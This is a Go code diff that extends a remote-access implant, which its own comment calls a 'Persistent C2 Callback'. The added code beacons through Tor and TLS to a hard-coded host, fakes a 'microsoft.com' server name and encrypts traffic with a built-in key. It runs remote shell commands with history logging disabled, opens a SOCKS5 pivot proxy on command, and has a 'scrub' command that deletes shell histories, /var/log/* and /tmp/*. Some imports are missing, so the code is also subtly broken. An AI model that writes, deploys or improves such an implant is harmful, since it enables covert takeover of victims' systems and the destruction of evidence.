@@ -9,7 +9,44 @@ import (
 	"os/exec"
 	"runtime"
 	"time"
+
+	"golang.org/x/net/proxy"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"crypto/tls"
+	"encoding/base64"
+	"io"
 )
+
+var sharedKey = []byte("shadow_default_secret_32bytes_!!")
+
+func encrypt(data []byte) string {
+	// APEX_PADDING: Add random junk to normalize packet size
+	padSize := 256 - (len(data) % 256)
+	padding := make([]byte, padSize)
+	rand.Read(padding)
+	
+	payload := append(data, '|' )
+	payload = append(payload, padding...)
+
+	block, _ := aes.NewCipher(sharedKey)
+	gcm, _ := cipher.NewGCM(block)
+	nonce := make([]byte, gcm.NonceSize())
+	io.ReadFull(rand.Reader, nonce)
+	ct := gcm.Seal(nonce, nonce, payload, nil)
+	return base64.StdEncoding.EncodeToString(ct)
+}
+
+func decrypt(data string) []byte {
+	raw, _ := base64.StdEncoding.DecodeString(data)
+	block, _ := aes.NewCipher(sharedKey)
+	gcm, _ := cipher.NewGCM(block)
+	nonceSize := gcm.NonceSize()
+	nonce, ct := raw[:nonceSize], raw[nonceSize:]
+	out, _ := gcm.Open(nil, nonce, ct, nil)
+	return out
+}
 
 // Shadow-Ghost Agent V1.0 — Persistent C2 Callback.
 // Tiny, Stealthy, and Indestructible.
@@ -18,6 +55,7 @@ type Command struct {
 	Type    string `json:"type"`
 	Cmd     string `json:"cmd,omitempty"`
 	Payload string `json:"payload,omitempty"`
+	Port    int    `json:"port,omitempty"`
 }
 
 type Packet struct {
@@ -29,59 +67,184 @@ type Packet struct {
 	Output      string `json:"output,omitempty"`
 }
 
-func getFingerprint() string {
-	// Professional Fingerprinting (Simple for V1)
-	name, _ := os.Hostname()
-	return fmt.Sprintf("%s-%s-%s", name, runtime.GOOS, runtime.GOARCH)
+func getShadowID() string {
+	// APEX_PRIVACY: Generate a hardware-linked but non-identifiable ID
+	host, _ := os.Hostname()
+	h := sha256.New()
+	h.Write([]byte(host + runtime.GOARCH + runtime.GOOS))
+	return hex.EncodeToString(h.Sum(nil))[:16]
 }
 
 func main() {
-	// Configuration (Injected at compile-time or defaults)
-	server := "127.0.0.1:44444" 
+	fmt.Println("[*] SHADOW_IGNITION: Entering total anonymity mode...")
+	// Configuration
+	server := "shadowcypher.site:44444"
+	torProxy := "127.0.0.1:9050" 
+
 	if len(os.Args) > 1 {
 		server = os.Args[1]
 	}
 
-	fp := getFingerprint()
-	host, _ := os.Hostname()
+	fp := getShadowID()
+	host := "shadow-node" // Masked hostname
 
 	for {
-		conn, err := net.Dial("tcp", server)
+		// APEX_JITTER: Randomized sleep intervals
+		jitter := time.Duration(rand.Intn(30)) * time.Second
+		time.Sleep(jitter)
+
+		var conn net.Conn
+		var err error
+
+		// APEX_STEALTH: Attempt Tor connection first with TLS Wrapping
+		dialer, proxyErr := proxy.SOCKS5("tcp", torProxy, nil, proxy.Direct)
+		
+		// TLS Config for Masquerading (Look like a normal web request)
+		tlsConfig := &tls.Config{
+			InsecureSkipVerify: true, // For self-signed Shadow-Plane certs
+			ServerName:         "microsoft.com", // SNI Masquerading decoy
+		}
+
+		if proxyErr == nil {
+			rawConn, proxyDialErr := dialer.Dial("tcp", server)
+			if proxyDialErr == nil {
+				conn = tls.Client(rawConn, tlsConfig)
+			}
+		}
+		
+		if conn == nil {
+			// Fallback to direct TLS if Tor fails
+			conn, err = tls.DialWithDialer(&net.Dialer{Timeout: 5 * time.Second}, "tcp", server, tlsConfig)
+		}
+
 		if err != nil {
 			time.Sleep(10 * time.Second)
 			continue
 		}
+		fmt.Printf("[*] GHOST_LINKED: Established link to %s\n", server)
 
-		// Initial Check-in (Handshake)
+		// Initial Check-in (Handshake with Challenge)
+		challenge := make([]byte, 32)
+		io.ReadFull(rand.Reader, challenge)
+		
 		checkin := Packet{
 			Type:        "ghost_checkin",
-			Nick:        fmt.Sprintf("Ghost_%s", fp[:8]),
+			Nick:        fmt.Sprintf("Shadow_%s", fp[:8]),
 			Fingerprint: fp,
 			OS:          runtime.GOOS,
 			Hostname:    host,
+			Payload:     base64.StdEncoding.EncodeToString(challenge),
 		}
-		json.NewEncoder(conn).Encode(checkin)
+		checkinBytes, _ := json.Marshal(checkin)
+		conn.Write([]byte(encrypt(checkinBytes) + "\n"))
 
 		scanner := bufio.NewScanner(conn)
 		for scanner.Scan() {
+			line := scanner.Text()
+			if line == "" { continue }
+			
+			// Attempt to decrypt
+			decrypted := decrypt(line)
+			if decrypted == nil {
+				fmt.Printf("[DEBUG] Decryption failed for line: %s\n", line)
+				decrypted = []byte(line)
+			} else {
+				fmt.Printf("[DEBUG] Decrypted: %s\n", string(decrypted))
+			}
+
 			var cmd Command
-			if err := json.Unmarshal(scanner.Bytes(), &cmd); err == nil {
+			if err := json.Unmarshal(decrypted, &cmd); err == nil {
 				if cmd.Type == "execute" {
+					os.Setenv("HISTFILE", "/dev/null")
 					out, err := exec.Command("sh", "-c", cmd.Cmd).CombinedOutput()
 					if err != nil {
 						out = []byte(fmt.Sprintf("ERROR: %v", err))
 					}
-					// Return output
+					// Return encrypted output
 					response := Packet{
 						Type:   "ghost_output",
 						Nick:   checkin.Nick,
 						Output: string(out),
 					}
-					json.NewEncoder(conn).Encode(response)
+					respBytes, _ := json.Marshal(response)
+					conn.Write([]byte(encrypt(respBytes) + "\n"))
+				} else if cmd.Type == "proxy" {
+					// Launch ephemeral SOCKS5 proxy on requested port
+					go startTacticalProxy(cmd.Port)
+					response := Packet{
+						Type:   "ghost_output",
+						Nick:   checkin.Nick,
+						Output: fmt.Sprintf("[+] PROXY_IGNITION: SOCKS5 Active on port %d", cmd.Port),
+					}
+					respBytes, _ := json.Marshal(response)
+					conn.Write([]byte(encrypt(respBytes) + "\n"))
+				} else if cmd.Type == "scrub" {
+					// APEX_FORENSICS: Purge all local traces
+					exec.Command("sh", "-c", "rm -rf ~/.bash_history ~/.zsh_history /var/log/* /tmp/*").Run()
+					exec.Command("sh", "-c", "history -c").Run()
+					response := Packet{
+						Type:   "ghost_output",
+						Nick:   checkin.Nick,
+						Output: "[+] DEEP_SCRUB_COMPLETE: Forensic traces purged.",
+					}
+					respBytes, _ := json.Marshal(response)
+					conn.Write([]byte(encrypt(respBytes) + "\n"))
 				}
 			}
 		}
 		conn.Close()
 		time.Sleep(5 * time.Second)
 	}
+}
+
+func startTacticalProxy(port int) {
+	l, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
+	if err != nil { return }
+	defer l.Close()
+	for {
+		c, err := l.Accept()
+		if err != nil { return }
+		go handleProxyConn(c)
+	}
+}
+
+func handleProxyConn(c net.Conn) {
+	// Simple SOCKS5 Handshake (V5, No Auth)
+	buf := make([]byte, 256)
+	_, err := io.ReadFull(c, buf[:2])
+	if err != nil || buf[0] != 0x05 { c.Close(); return }
+	n := int(buf[1])
+	io.ReadFull(c, buf[:n])
+	c.Write([]byte{0x05, 0x00}) // No Auth
+
+	// Connect Request
+	io.ReadFull(c, buf[:4])
+	if buf[1] != 0x01 { c.Close(); return } // Only CONNECT supported
+
+	var addr string
+	switch buf[3] {
+	case 0x01: // IPv4
+		io.ReadFull(c, buf[:4])
+		addr = net.IP(buf[:4]).String()
+	case 0x03: // Domain
+		io.ReadFull(c, buf[:1])
+		sz := int(buf[0])
+		io.ReadFull(c, buf[:sz])
+		addr = string(buf[:sz])
+	}
+	io.ReadFull(c, buf[:2])
+	p := (int(buf[0]) << 8) | int(buf[1])
+	target := fmt.Sprintf("%s:%d", addr, p)
+
+	remote, err := net.Dial("tcp", target)
+	if err != nil {
+		c.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
+		c.Close()
+		return
+	}
+	c.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
+	go io.Copy(remote, c)
+	io.Copy(c, remote)
+	remote.Close()
+	c.Close()
 }
